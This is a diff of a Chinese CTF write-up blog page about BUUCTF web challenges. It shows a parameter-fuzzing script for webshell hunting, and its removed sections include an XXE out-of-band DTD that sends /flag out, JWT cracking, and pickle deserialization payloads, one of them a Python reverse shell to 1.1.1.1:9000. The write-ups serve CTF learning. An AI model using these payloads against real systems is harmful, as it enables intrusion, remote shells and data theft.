@@ -414,13 +414,13 @@
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1.4k字</p>
+      <p>字数：643字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：6分钟</p>
+      <p>时长：3分钟</p>
     </a>
   </div>
 
@@ -483,44 +483,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:/Users/Desktop/www/src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>	<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:	<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">r&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">r&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;		<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;		<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)		<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()						<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:			<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()					<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()			<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:		<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:						<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>自己写了好久都没成功跑出来，也懒得再改了，直接参考大佬的exp</p>
-<h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>java web项目目录：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">webapps    # 含Web应用的程序(JSP、Servlet和JavaBean等)</span><br><span class="line">webapps/META-INF/	#存放一些meta information相关的文件</span><br><span class="line">webapps/WEB-INF/classes/    #用于存放java字节码文件</span><br><span class="line">webapps/WEB-INF/lib/    #用于存放该工程用到的库，例如servlet-api.jar等等</span><br><span class="line">webapps/WEB-INF/web.xml    #web工程的配置文件，完成用户请求的逻辑名称到真正的servlet类的映射</span><br></pre></td></tr></table></figure>
-
-<h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>查看源码发现提示flag在<code>/flag</code>,浏览发现可以上传文件，第一时间想到上传jsp webshell，但是不知道路径，上传完之后发现可以下载，这里就存在个任意文件下载</p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510231429.png" style="zoom:80%;">
-
-<p>试着去读<code>WEB-INF/web.xml</code></p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510231631.png" style="zoom:80%;">
-
-<p>根据这个包的路径去下载<code>.class</code>文件，由于这个是字节码文件，我们需要反编译一下，发现</p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510234936.png" style="zoom:80%;">
-
-<p>利用EXCEL进行XXE攻击：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3741">https://xz.aliyun.com/t/3741</a></p>
-<p>我们就可以xxe了，如下构造：</p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510235326.png" style="zoom:67%;">
-
-<p>vps上的test.dtd：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最后上传以类似于<code>excel-1.xlsx</code>的名字上传，就能收到flag了</p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510235915.png" style="zoom:80%;">
-
-<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>这题相对于前一题就比较简单了</p>
-<p>打开是一个登陆页面，暴力破解发现密码是<code>admin888</code>，登陆进去提示flag不在这</p>
-<p>登陆页面有个help，打开提示<code>java.io.FileNotFoundException</code>，猜测应该是读文件的</p>
-<p>直接访问<code>/help.docx</code>，发现可以把文件下载下来，猜测可以任意文件下载，但GET不能，不清楚为啥</p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200515154314.png" style="zoom:80%;">
-
-<p>读下<code>WEB-INF/web.xml</code> ，看到</p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200515154514.png" style="zoom:80%;">
-
-<p>读下源码<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200515154752.png" style="zoom:80%;">
-
-<p>base64解密就能得到flag，也可以反编译一下看下代码</p>
-<img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200515155046.png" style="zoom:80%;">
-
-<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><h3 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h3><p>找个unicode字符： <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a> 搜索<strong>thousand</strong></p>
+<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>找个unicode字符： <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a> 搜索<strong>thousand</strong></p>
 <p>随便找个</p>
 <img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20201016161108654.png" alt="image-20201016161108654" style="zoom: 80%;">
 
@@ -532,42 +495,12 @@
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5402">https://xz.aliyun.com/t/5402</a></p>
-<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><p>xxe 可以任意文件读取</p>
+<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>xxe 可以任意文件读取</p>
 <p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210212152039937.png" alt="image-20210212152039937"></p>
 <p>读/flag /flag.txt /etc/hosts doLogin.php都没有啥 猜测flag在内网 读取arp表</p>
 <p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210212152152833.png" alt="image-20210212152152833"></p>
 <p>扫描同网段其它机器</p>
 <p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210212152218756.png" alt="image-20210212152218756"></p>
-<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><p>注册登陆 看到</p>
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221145423423.png" alt="image-20210221145423423"></p>
-<p>访问<code>/static/img/lv/lv6.png</code> 存在 写个脚本跑下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://46cda335-76dc-4e06-a545-b8e90926388e.node3.buuoj.cn/shop?page=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    r=requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p>得到181 访问 购买 抓包 在结算时修改discount</p>
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221151050845.png" alt="image-20210221151050845"></p>
-<p>访问Location位置</p>
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221151131680.png" alt="image-20210221151131680"></p>
-<p>看到cookie里有jwt</p>
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221150108117.png" alt="image-20210221150108117"></p>
-<p>jwt crack破解一下密码 得到密码<code>1Kun</code></p>
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221150005598.png" alt="image-20210221150005598"></p>
-<p>修改jwt中的username</p>
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221151212041.png" alt="image-20210221151212041"></p>
-<p>替换访问</p>
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221151341733.png" alt="image-20210221151341733"></p>
-<p>得到源码：<code>/static/asd1f654e683wq/www.zip</code> 在Admin.py看到</p>
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221151734816.png" alt="image-20210221151734816"></p>
-<p>pikle反序列化 从main.py print语句能看出为python2 没有过滤 直接<code>__reduce__</code>方法rce </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;sleep 3&quot;</span>,))</span><br><span class="line">a=test()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">print(urllib.quote(c))</span><br></pre></td></tr></table></figure>
-
-<p>发现可以延时 没有curl 有可能没bash 因此尝试使用python反弹shell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> ((os.system,(<span class="string">&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\&#x27;&#x27;</span>,))</span><br><span class="line">a = test()</span><br><span class="line">c = pickle.dumps(a)</span><br><span class="line">print(urllib.quote(c))</span><br></pre></td></tr></table></figure>
-
-<p>或者直接读取文件</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = test()</span><br><span class="line">c = pickle.dumps(a)</span><br><span class="line">print(urllib.quote(c))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/image-20210221155115034.png" alt="image-20210221155115034"></p>
-<p>注意是POST请求并且要带上<code>_xsrf</code>参数</p>
 
           
             <div class='article_footer'>
@@ -624,10 +557,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-21T15:58:43+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-09T14:17:52+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2021年2月21日</p>
+    <p>更新于：2021年3月9日</p>
   </a>
 </div>
 
@@ -771,7 +704,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-text">[强网杯 2019]高明的黑客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava"><span class="toc-text">[网鼎杯 2020 青龙组]filejava</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-1"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-text">[RoarCTF 2019]Easy Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-2"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-text">[ASIS 2019]Unicorn shop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-3"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-True-XML-cookbook"><span class="toc-text">[NCTF2019]True XML cookbook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-4"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun"><span class="toc-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-5"><span class="toc-text">writeup</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-text">[强网杯 2019]高明的黑客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-text">[ASIS 2019]Unicorn shop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-1"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-True-XML-cookbook"><span class="toc-text">[NCTF2019]True XML cookbook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-2"><span class="toc-text">writeup</span></a></li></ol></li></ol>
     </div>
   </section>
 
